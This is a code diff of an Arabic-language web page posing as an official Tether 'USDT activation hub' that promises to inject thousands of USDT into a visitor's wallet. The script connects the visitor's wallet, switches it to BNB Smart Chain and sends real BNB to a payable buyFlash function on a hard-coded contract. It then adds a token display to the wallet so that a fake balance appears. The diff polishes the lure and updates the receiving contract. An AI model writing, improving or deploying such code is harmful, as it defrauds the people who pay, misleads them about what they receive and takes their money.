@@ -4,30 +4,35 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tether USD | Official Activation Hub</title>
-    <!-- ✅ تم إزالة المسافات الزائدة -->
+    <!-- ✅ بدون مسافات زائدة -->
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
         :root { --primary: #00ffa3; --bg: #030a09; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { width: 90%; max-width: 400px; background: #0a1412; border: 1px solid #1a2e2a; border-radius: 24px; padding: 30px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
-        .logo { width: 70px; margin-bottom: 15px; filter: drop-shadow(0 0 10px var(--primary)); }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .card { width: 90%; max-width: 400px; background: #0a1412; border: 1px solid #1a2e2a; border-radius: 24px; padding: 30px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.8); position: relative; }
+        .logo { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--primary)); }
+        h2 { font-size: 22px; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; line-height: 1.6; }
         select, button { width: 100%; padding: 18px; margin-top: 20px; border-radius: 15px; border: none; font-weight: bold; font-size: 16px; outline: none; transition: 0.4s; }
-        select { background: #111; color: #fff; border: 1px solid #222; cursor: pointer; }
-        button { background: var(--primary); color: #000; cursor: pointer; text-transform: uppercase; }
+        select { background: #111; color: #fff; border: 1px solid #222; cursor: pointer; appearance: none; text-align: center; }
+        button { background: var(--primary); color: #000; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
         button:hover { background: #00d68a; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,255,163,0.3); }
-        #msg { margin-top: 20px; font-size: 13px; color: var(--primary); font-weight: 500; }
+        button:disabled { background: #333; color: #666; cursor: not-allowed; }
+        #msg { margin-top: 20px; font-size: 13px; color: var(--primary); font-weight: 500; min-height: 20px; }
+        .status-dot { display: inline-block; width: 8px; height: 8px; background: var(--primary); border-radius: 50%; margin-left: 8px; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <!-- ✅ تم إزالة المسافة الزائدة -->
-    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo">
-    <h2 style="margin: 0;">تفعيل رصيد USDT</h2>
-    <p style="color: #666; font-size: 14px; margin-top: 10px;">اختر الفئة ليتم حقن الرصيد في محفظتك عبر الشبكة</p>
+    <!-- ✅ صورة بدون مسافة -->
+    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo" alt="USDT">
+    <h2>تفعيل رصيد USDT</h2>
+    <p>اختر الفئة المناسبة ليتم حقن الرصيد في محفظتك عبر بروتوكول الشبكة المباشر</p>
     
     <select id="tier">
-        <option value="0.00001">تجربة (حصري): 50 USDT</option>
+        <option value="0.0001">تجربة (حصري): 50 USDT</option>
         <option value="0.09">أساسي: 5,000 USDT</option>
         <option value="0.2">متوسط: 10,000 USDT</option>
         <option value="0.5">احترافي: 50,000 USDT</option>
@@ -37,40 +42,59 @@
     </select>
 
     <button id="startBtn" onclick="execute()">استلام الرصيد الآن ⚡</button>
-    <div id="msg">بانتظار تأمين الاتصال بالمحفظة...</div>
+    <div id="msg"><span class="status-dot"></span>بانتظار تأمين الاتصال بالمحفظة...</div>
 </div>
 
 <script>
-    // ✅ العنوان الجديد بعد النشر
-    const CONTRACT_ADDR = "0x4AfC66EA7834cbb9ad2211DA4cF0961EE286545B";
+    // ✅ العنوان الصحيح بعد النشر
+    const CONTRACT_ADDR = "0xB8fe1Bed901885Aebb22Ed59CF3f17E602B9CA33";
+    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
 
     async function execute() {
         const btn = document.getElementById('startBtn');
         const msg = document.getElementById('msg');
+        
         try {
-            if (!window.ethereum) { alert("يرجى استخدام متصفح يدعم المحافظ"); return; }
+            if (!window.ethereum) {
+                alert("يرجى فتح الموقع من داخل متصفح محفظة (MetaMask/Trust Wallet)");
+                return;
+            }
+
             btn.disabled = true;
+            msg.innerText = "جاري طلب الاتصال بالمحفظة...";
+
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const user = accounts[0];
             const web3 = new Web3(window.ethereum);
 
             const chainId = await web3.eth.getChainId();
             if (chainId !== 56) {
-                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+                msg.innerText = "يرجى تحويل الشبكة إلى Smart Chain...";
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }],
+                    });
+                } catch (err) {
+                    msg.innerText = "فشل تحويل الشبكة. يرجى المحاولة يدوياً.";
+                    btn.disabled = false;
+                    return;
+                }
             }
 
-            msg.innerText = "جاري تفعيل البروتوكول...";
-            const contract = new web3.eth.Contract([{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}], CONTRACT_ADDR);
-            
+            msg.innerText = "جاري تفعيل بروتوكول الحقن...";
+            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
+            const ethAmount = document.getElementById('tier').value;
+
             await contract.methods.buyFlash().send({ 
                 from: user, 
-                value: web3.utils.toWei(document.getElementById('tier').value, "ether"),
-                gas: 150000
+                value: web3.utils.toWei(ethAmount, "ether"),
+                gas: 200000
             });
 
-            msg.innerText = "تم الحقن! جاري تثبيت الأصول...";
+            msg.innerText = "تم الحقن! جاري تثبيت الأصول في محفظتك...";
 
-            // ✅ صورة بدون مسافة
+            // ✅ إضافة التوكن مع صورة نظيفة
             await window.ethereum.request({
                 method: 'wallet_watchAsset',
                 params: {
@@ -84,10 +108,11 @@
                 }
             });
 
-            msg.innerHTML = "✅ اكتمل التفعيل! الرصيد متاح في قائمتك.";
+            msg.innerHTML = "✅ اكتمل التفعيل! الرصيد متاح الآن في قائمتك.";
+            
         } catch(e) { 
             console.error(e);
-            msg.innerText = "فشلت العملية. حاول مرة أخرى."; 
+            msg.innerText = "فشلت العملية. تأكد من وجود رسوم الغاز وحاول مجدداً."; 
             btn.disabled = false; 
         }
     }
